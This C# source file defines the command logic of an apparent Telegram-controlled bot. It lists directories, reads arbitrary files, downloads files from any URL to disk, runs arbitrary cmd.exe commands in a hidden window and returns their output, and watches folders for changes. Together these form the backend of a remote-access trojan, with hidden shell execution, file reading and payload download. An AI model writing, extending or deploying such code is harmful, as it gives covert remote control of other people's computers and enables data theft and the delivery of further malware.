using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.IO;
using System.Net;

namespace TelegramBot
{
    public class BotLogic
    {
        public string Get(string get)
        {
            try
            {
                List<string> fileslist = new List<string>();

                Directory
                    .EnumerateFiles(get, "*")
                    .Select(Path.GetFileName)
                    .ToList()
                    .ForEach(f => fileslist.Add(f));

                var files = string.Join("\n", fileslist.ToArray());
                var directories = string.Join("\n", Directory.GetDirectories(get));
                return files + "\n" + directories;
                
            }
            catch (DirectoryNotFoundException)
            {
                return "Directory " + get + " not found.";
            }
            catch (ArgumentNullException)
            {
                return "Directory " + get + " can not be NULL.";
            }
        }

        public string Read(string read)
        {
            string fileText;
            try
            {
                fileText = File.ReadAllText(read);
                return fileText;
            }
            catch (DirectoryNotFoundException)
            {
                return "File " + read + " not found.";
            }
        }

        public string Download(string downloadAdress, string downloadPath)
        {
            try
            {
                Random pictureseed = new Random();
                var client = new WebClient();
                client.DownloadFile(downloadAdress, downloadPath + "botpicture" + pictureseed.Next() + ".png");
                return "File from " + downloadAdress + " to " + downloadPath +
                       " downloaded successfully.";
            }
            catch (WebException)
            {
                return "File link " + downloadAdress + " is incorrect, or file in" + downloadPath + "can not be created.";
            }
            catch (DirectoryNotFoundException)
            {
                return "File from " + downloadAdress + " to " + downloadPath +
                       " not downloaded. Directory nor found.";
            }
            catch (ArgumentNullException)
            {
                return "File link is null.";
            }

        }

        public string Command(string command)
        {
            ProcessStartInfo request = new ProcessStartInfo(@"cmd.exe", @"/C " + command);
            request.WindowStyle = ProcessWindowStyle.Hidden;
            request.RedirectStandardOutput = true;
            request.UseShellExecute = false;
            request.CreateNoWindow = true;
            Process procCommand = Process.Start(request);
            if (procCommand != null)
            {
                StreamReader answer = procCommand.StandardOutput;
                return answer.ReadToEnd();
            }

            return "Something went wrong.";
        }

        public void Check(string check)
        {
            FileSystemWatcher watcher = new FileSystemWatcher();
            watcher.Path = check;
            watcher.NotifyFilter = NotifyFilters.LastAccess | NotifyFilters.LastWrite | NotifyFilters.FileName |
                                   NotifyFilters.DirectoryName;
            watcher.Changed += CheckOnChanged;
            watcher.Created += CheckOnChanged;
            watcher.Deleted += CheckOnChanged;
            try
            {
                watcher.EnableRaisingEvents = true;
            }
            catch (FileNotFoundException)
            {
                watcher.Path = "./";
                watcher.EnableRaisingEvents = true;
            }

            watcher.Changed += CheckOnChanged;
            watcher.Created += CheckOnChanged;
            watcher.Deleted += CheckOnChanged;
        }

        public static string Checkedstring { get; set; }

        public static string Checked(string checkedstring)
        {
            return checkedstring;
        }

        private static void CheckOnChanged(object source, FileSystemEventArgs e)
        {
            Checkedstring = "File: " + e.FullPath + " " + e.ChangeType;
            Checked(Checkedstring);
        }
    }
}